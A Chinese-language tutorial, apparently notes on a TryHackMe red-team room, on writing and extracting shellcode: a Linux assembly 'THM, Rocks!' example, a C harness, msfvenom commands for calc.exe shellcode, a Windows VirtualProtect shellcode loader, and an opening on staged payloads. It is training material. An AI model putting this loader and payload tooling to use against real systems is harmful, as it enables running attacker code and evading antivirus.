<h2 id="Shellcode">Shellcode</h2>
<p>Shellcode 是一组精心设计的机器代码指令，用于指示易受攻击的程序运行附加功能，并且在大多数情况下，提供对系统 shell 的访问或创建反向命令 shell。</p>
<p>一旦 shellcode 被注入到进程中并由易受攻击的软件或程序执行，它就会修改代码运行流程，以更新程序的寄存器和功能，从而执行攻击者的代码。</p>
<p>它通常用汇编语言编写，并翻译成十六进制操作码（operational codes <strong>opcode</strong>）。编写独特和自定义的 shellcode 有助于显著规避杀毒软件。但是，编写自定义 shellcode 需要在处理汇编语言方面具备出色的知识和技能，这不是一件容易的事！</p>
<h3 id="Shellcode-入门">Shellcode 入门</h3>
<p>要制作一个 Shellcode，你需要掌握多项技能，包括对 <strong>x86/x64 CPU 架构</strong>、<strong>汇编语言</strong>、<strong>C 语言</strong>以及 <strong>Linux/Windows 操作系统</strong>的深入理解。</p>
<p>制作 Shellcode 的核心步骤是<strong>编写汇编代码</strong>，然后将其<strong>编译并提取出机器码</strong>。我们以一个简单的 Shellcode 为例，它将在屏幕上打印字符串 “THM, Rocks!”，然后正常退出程序。这个过程需要用到两个关键的系统调用：</p>
<ul>
<li><code>sys_write</code>：用于将数据写入文件描述符（这里是标准输出）。</li>
<li><code>sys_exit</code>：用于终止程序执行。</li>
</ul>
<h4 id="理解系统调用-Syscall">理解系统调用 (Syscall)</h4>
<p>系统调用是程序请求操作系统内核执行特定任务的方式。在 64 位 Linux 系统中，每个系统调用都有一个对应的编号，这个编号需要放在 <code>rax</code> 寄存器中。其他参数则通过 <code>rdi</code>、<code>rsi</code> 和 <code>rdx</code> 寄存器传递。</p>
<table>
<thead>
<tr>
<th><strong>rax</strong></th>
<th><strong>System Call</strong></th>
<th><strong>rdi</strong></th>
<th><strong>rsi</strong></th>
<th><strong>rdx</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0x1</td>
<td>sys_write</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>0x3c</td>
<td>sys_exit</td>
<td>int error_code</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>上表告诉我们，要使用系统调用来调用 <code>sys_write</code> 和 <code>sys_exit</code> 函数，我们需要在不同的处理器寄存器中设置哪些值。对于 64 位 Linux，<code>rax</code> 寄存器用于指示我们希望调用的内核函数。将 <code>rax</code> 设置为 0x1 会使内核执行 <code>sys_write</code>，将 <code>rax</code> 设置为 0x3c 会使内核执行 <code>sys_exit</code>。这两个函数都需要一些参数才能工作，这些参数可以通过 <code>rdi</code>、<code>rsi</code> 和 <code>rdx</code> 寄存器设置。</p>
<ul>
<li><strong><code>sys_write</code> (0x1)</strong>：
<ul>
<li><strong><code>rdi</code> (文件描述符)</strong>：指定要写入的目标。<code>1</code> 通常代表标准输出（屏幕）。</li>
<li><strong><code>rsi</code> (缓冲区指针)</strong>：指向我们要打印的字符串的内存地址。</li>
<li><strong><code>rdx</code> (计数)</strong>：要打印的字符串的字节数。</li>
</ul>
</li>
<li><strong><code>sys_exit</code> (0x3c)</strong>：
<ul>
<li><strong><code>rdi</code> (退出代码)</strong>：指定程序的退出状态。<code>0</code> 表示程序成功执行。</li>
</ul>
</li>
</ul>
<p>通过在正确的寄存器中设置这些值，我们就可以让程序请求内核完成我们需要的操作。</p>
<p>你可以在<a target="_blank" rel="noopener" href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">这里</a>找到可用 64 位 Linux 系统调用的完整参考。</p>
<h4 id="代码">代码</h4>
<figure class="shiki asm"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">global _start</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">section .text</span></span>
<span class="line"><span style="color: #61AFEF">_start:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">jmp</span><span style="color: #ABB2BF"> MESSAGE      </span><span style="color: #7F848E; font-style: italic">; 1) 跳转到 MESSAGE</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">GOBACK:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rax</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rdi</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">pop</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rsi</span><span style="color: #ABB2BF">          </span><span style="color: #7F848E; font-style: italic">; 3) 把堆栈的地址取出来放进 RSI 寄存器</span></span>
<span class="line"><span style="color: #ABB2BF">    				 </span><span style="color: #7F848E; font-style: italic">; 这样就有了我们字符串的地址了</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rdx</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xd</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">syscall</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rax</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3c</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rdi</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">syscall</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">MESSAGE:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">call</span><span style="color: #ABB2BF"> GOBACK       </span><span style="color: #7F848E; font-style: italic">; 2) 他会把下一条指令的地址压入堆栈</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">db</span><span style="color: #ABB2BF"> &quot;THM, Rocks!&quot;, </span><span style="color: #D19A66">0dh</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0ah</span></span></code></pre></div></div></figure>
<h4 id="汇编代码的工作原理">汇编代码的工作原理</h4>
<p><strong>准备 <code>sys_write</code> 调用</strong></p>
<ul>
<li>我们将 <code>0x1</code> 存入 <strong><code>rax</code></strong> 寄存器，指示要调用 <code>sys_write</code>。</li>
<li>将 <code>1</code> 存入 <strong><code>rdi</code></strong> 寄存器，指定标准输出（屏幕）。</li>
<li>将字符串的地址存入 <strong><code>rsi</code></strong> 寄存器。为此，我们使用一个技巧：<code>call GOBACK</code>。<code>call</code> 指令会将下一条指令的地址（即我们消息字符串的起始地址）压入堆栈。然后 <code>pop rsi</code> 将其弹出到 <code>rsi</code> 中。</li>
<li>将字符串的长度存入 <strong><code>rdx</code></strong> 寄存器。</li>
<li>最后，使用 <code>syscall</code> 指令执行 <code>sys_write</code>。</li>
</ul>
<p><strong>准备 <code>sys_exit</code> 调用</strong></p>
<ul>
<li>将 <code>0x3c</code> 存入 <strong><code>rax</code></strong> 寄存器，指示要调用 <code>sys_exit</code>。</li>
<li>将 <code>0</code> 存入 <strong><code>rdi</code></strong> 寄存器，表示程序成功退出。</li>
<li>使用 <code>syscall</code> 指令执行 <code>sys_exit</code>。</li>
</ul>
<p><strong>字符串存储</strong></p>
<ul>
<li>我们的消息字符串“THM, Rocks!”以及换行符 <code>0d, 0a</code> 都被存储在汇编代码的末尾，这样才能利用 <code>call</code> 指令来获取其地址。</li>
</ul>
<h4 id="生成与测试-Shellcode">生成与测试 Shellcode</h4>
<p>一旦汇编代码编写完成，我们就可以将其编译并提取为 Shellcode：</p>
<ol>
<li><strong>编译与链接</strong>：使用 <code>nasm</code> 编译 <code>.asm</code> 文件，然后用 <code>ld</code> 链接，生成可执行文件 <code>thm</code>。</li>
</ol>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">编译</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">链接</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">执行</span></span>
<span class="line"><span style="color: #61AFEF">nasm</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">elf64</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.asm</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">ld</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.o</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">./thm</span></span></code></pre></div></div></figure>
<ol start="2">
<li><strong>提取 Shellcode</strong>：使用 <code>objdump</code> 查看编译后的二进制文件的 <code>.text</code> 段，然后用 <code>objcopy</code> 将 <code>.text</code> 段以纯二进制格式提取出来。</li>
</ol>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">objdump</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm</span></span>
<span class="line"><span style="color: #61AFEF">objcopy</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-j</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.text</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-O</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">binary</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.text</span></span></code></pre></div></div></figure>
<p><strong>3. 转换为 C 语言格式</strong>：使用 <code>xxd</code> 命令将二进制文件 <code>thm.text</code> 转换成 C 语言数组的十六进制表示。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xxd</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.text</span></span></code></pre></div></div></figure>
<p>现在就从汇编代码中生成了我们的 shellcode，是不是很有趣，可以测试一下 shellcode 有没有用，注入 C 程序试试。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">**</span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> message</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">eb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">1e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">bf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ba</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">05</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">bf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">05</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">48</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">52</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">6f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">63</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">6b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">73</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">21</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0a</span></span>
<span class="line"><span style="color: #ABB2BF">    };</span></span>
<span class="line"><span style="color: #ABB2BF">    </span></span>
<span class="line"><span style="color: #ABB2BF">    (</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)())message)();</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>最后，使用 <code>gcc</code> 编译并执行这个 C 程序。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">gcc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-g</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Wall</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-z</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">execstack</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.c</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmx</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">./thmx</span></span></code></pre></div></div></figure>
<h3 id="Shellcode-利用">Shellcode 利用</h3>
<h4 id="使用-Msfvenom-生成-Shellcode">使用 Msfvenom 生成 Shellcode</h4>
<p>第一个没什么好说的，msf 指定输出格式生成</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/exec</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd=calc.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c</span></span></code></pre></div></div></figure>
<h4 id="Shellcode-加载器">Shellcode 加载器</h4>
<p>Shellcode 本身无法独立执行，它需要一个<strong>加载器（Loader）</strong>。加载器是一个简单的程序，其唯一任务就是将 Shellcode 放入内存并执行它。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> stager</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> };</span></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">        DWORD oldProtect;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">VirtualProtect</span><span style="color: #ABB2BF">(stager, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(stager), PAGE_EXECUTE_READ, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">oldProtect);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">shellcode)() </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)())(</span><span style="color: #C678DD">void*</span><span style="color: #ABB2BF">)stager;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">shellcode</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>编译</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">i686-w64-mingw32-gcc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">calc.c</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">calc-MSF.exe</span></span></code></pre></div></div></figure>
<h4 id="从可执行文件（EXE）中提取-Shellcode">从可执行文件（EXE）中提取 Shellcode</h4>
<p>Shellcode 并不总是以 C 语言数组的形式存在。在更高级的场景中，它可能被存储在原始的二进制文件（<code>.bin</code>）中，这是许多命令与控制（C2）框架的首选格式。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">生成</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.bin</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">文件</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/exec</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd=calc.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">raw</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">/tmp/example.bin</span></span>
<span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">查看文件类型</span></span>
<span class="line"><span style="color: #61AFEF">file</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/example.bin</span></span>
<span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">用</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">xxd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">提取</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">进制</span></span>
<span class="line"><span style="color: #61AFEF">xxd</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/example.bin</span></span></code></pre></div></div></figure>
<p>可以从上面生成的 C 代码 shellcode 比对，这俩是一样的。</p>
<p>但是我觉得这个标题描述有问题，应该是找一个 exe 文件直接提取他的入口点，然后 dump 出来，这样才是从 exe 文件中提取。</p>
<h2 id="阶段-Payload">阶段 Payload</h2>
<p>之前在玩 MSF 的时候就发现分大马和小马了，这就是房间里面说的 <strong>staged</strong> or <strong>stageless</strong> payloads。</p>
<p>在渗透测试和恶意软件开发中，Payload 通常分为两种类型：<strong>无阶段 (Stageless)</strong> 和 <strong>分阶段 (Staged)</strong>。它们代表了两种不同的代码投递和执行策略，各有优缺点，需要根据目标环境来选择。</p>
<h3 id="无阶段-Payload"><strong>无阶段 Payload</strong></h3>
<p>无阶段 Payload 是一个<strong>单一、完整</strong>的可执行文件，包含了恶意代码所需的所有功能。它不需要从攻击者的服务器下载任何额外的组件。</p>
<img src="/thm_rthe/f92f294a9e599967a0961b4273381be6.png" class="" title="Staged Payload - stage0">
<p><strong>优点：</strong></p>
<ul>
<li><strong>独立性强</strong>：Payload 包含了所有必需的代码，无需额外的网络连接。</li>
<li><strong>隐蔽性高</strong>：由于没有后续的网络下载行为，它更难被网络安全设备（如 IPS）检测到。</li>
